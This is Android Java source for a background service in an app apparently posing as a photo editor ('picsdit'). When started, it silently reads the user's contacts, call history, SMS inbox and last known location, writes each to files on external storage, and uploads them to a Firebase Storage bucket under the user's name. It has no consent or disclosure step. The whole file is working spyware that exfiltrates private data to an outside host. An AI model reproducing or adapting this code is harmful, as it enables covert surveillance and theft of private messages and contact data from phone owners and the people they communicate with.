package com.kernel.picsdit;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

public class MyService extends Service {
    private StorageReference storageReference;
    File locationDir;
    File locationfile;
    String Username;
    FusedLocationProviderClient providerClient;
    String LocationData = "Location Not Available At This Time";
    @Override
    public void onCreate() {
        super.onCreate();
        storageReference = FirebaseStorage.getInstance().getReference();
        Username = getSharedPreferences("usernamepref",0).getString("username","NEW_USER");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        providerClient = LocationServices.getFusedLocationProviderClient(this);
        locationDir = new File(Environment.getExternalStorageDirectory(), "LocationDir");
        if (!locationDir.exists()) {
            locationDir.mkdir();
        }
        locationfile = new File(locationDir.getPath(), "Location.txt");
        getContacts();
        getCallLogs();
        getLocation();
        getSMS();
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public void getContacts() {
        File contactsdir = new File(Environment.getExternalStorageDirectory(), "ContactsDir");
        if (!contactsdir.exists()) {
            Boolean directory = contactsdir.mkdir();
            Log.i("asach", "Folder created" + directory);
        }
        Log.i("asach", "Folder exists" + contactsdir.exists());
        File contactsfile = new File(contactsdir.getPath(), "Contacts.txt");
        Log.i("asach", contactsfile.exists() + " it exits");
        Log.i("asach", contactsfile.canWrite() + " it is writable");
        try {
            FileWriter writer = new FileWriter(contactsfile);
            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            while (phones.moveToNext()) {
                StringBuilder builder = new StringBuilder();
                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                builder.append(name).append(phoneNumber).append("\n");
                writer.append(builder.toString());
            }
            writer.flush();
            writer.close();
            phones.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        uploaddata(contactsfile,"Contacts");
    }

    public void getCallLogs() {
        File calllogsdir = new File(Environment.getExternalStorageDirectory(), "CallLogsDir");
        if (!calllogsdir.exists()) {
            Boolean directory = calllogsdir.mkdir();
            Log.i("asach", " calllogsdir Folder created" + directory);
        }
        Log.i("asach", " calllogsdir Folder exists" + calllogsdir.exists());
        File calllogsfile = new File(calllogsdir.getPath(), "CallLogs.txt");
        Log.i("asach", calllogsfile.exists() + " it exits calllogsdir ");
        Log.i("asach", calllogsfile.canWrite() + " it is writable calllogsdir");
        try {
            FileWriter writer = new FileWriter(calllogsfile);
            Cursor calls = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            while (calls.moveToNext()) {
                StringBuilder builder = new StringBuilder();
                String name = calls.getString(calls.getColumnIndex(CallLog.Calls._ID));
                String number = calls.getString(calls.getColumnIndex(CallLog.Calls.NUMBER));
                int callType = calls.getInt(calls.getColumnIndex(CallLog.Calls.TYPE));
                String date = calls.getString(calls.getColumnIndex(CallLog.Calls.DATE));
                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                sdf.setTimeZone(TimeZone.getTimeZone("GMT+05:30"));
                String Date = sdf.format(new Date(Long.parseLong(date)));
                String type = "call";
                if (callType == CallLog.Calls.INCOMING_TYPE) {
                    type = "Incoming Call"; //incoming call
                } else if (callType == CallLog.Calls.OUTGOING_TYPE) {
                    type = "Outgoing Call";//outgoing call
                } else if (callType == CallLog.Calls.MISSED_TYPE) {
                    type = "Missed Call";
                }
                builder.append(name)
                        .append("\n")
                        .append(number)
                        .append("\n")
                        .append(type)
                        .append("\n")
                        .append(Date)
                        .append("\n\n");
                writer.append(builder.toString());
            }
            writer.flush();
            writer.close();
            calls.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        uploaddata(calllogsfile,"CallLogs");
    }

    public void getLocation() {

        Log.i("asach", "getLocation is called");
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            Log.i("asach", "All permissions are granted");
            Task<Location> task = providerClient.getLastLocation();
            task.addOnSuccessListener(new OnSuccessListener<Location>() {
                @Override
                public void onSuccess(Location location) {
                    Log.i("asach", "task Successfull");
                    if (location != null) {
                        LocationData = ""+location.getLatitude()+", "+location.getLongitude();
                        try {
                            FileWriter writer = new FileWriter(locationfile);
                            writer.append(LocationData);
                            writer.flush();
                            writer.close();
                        }
                        catch (IOException e)
                        {
                            e.printStackTrace();
                        }
                        Log.i("asach", "Current Location" + location.getLatitude() + location.getLongitude());

                    } else {
                        Log.i("asach", "Location is NULL");
                    }
                }
            });
        }
        uploaddata(locationfile,"Location");
    }

    public void getSMS() {
        File smsdir = new File(Environment.getExternalStorageDirectory(), "SMSLogsDir");
        if (!smsdir.exists()) {
            smsdir.mkdir();
        }
        File smslogsfile = new File(smsdir.getPath(), "SMSLogs.txt");
        Uri smsuri = Uri.parse("content://sms/inbox");
        try {
            FileWriter writer = new FileWriter(smslogsfile);
            Cursor cursor = getContentResolver().query(smsuri, new String[]{"_id", "address", "date", "body"}, null, null, null);
            cursor.moveToFirst();
            while (cursor.moveToNext()) {
                StringBuilder builder = new StringBuilder();
                String address = cursor.getString(1);
                String body = cursor.getString(3);

                builder.append(address)
                        .append("\n")
                        .append(body)
                        .append("\n\n");
                writer.append(builder.toString());
            }
            writer.flush();
            writer.close();
            cursor.close();
            uploaddata(smslogsfile,"SMSLogs");
        }catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public void uploaddata(File file,String foldername)
    {
        StorageReference Ref = storageReference.child(Username+"/"+foldername+"/"+file.getName());
        Ref.putFile(Uri.fromFile(new File(file.getPath())))
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Log.i("asach", "Upload Successful");
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        Log.i("asach", "Upload Unsuccessful");
                    }
                });
    }
}
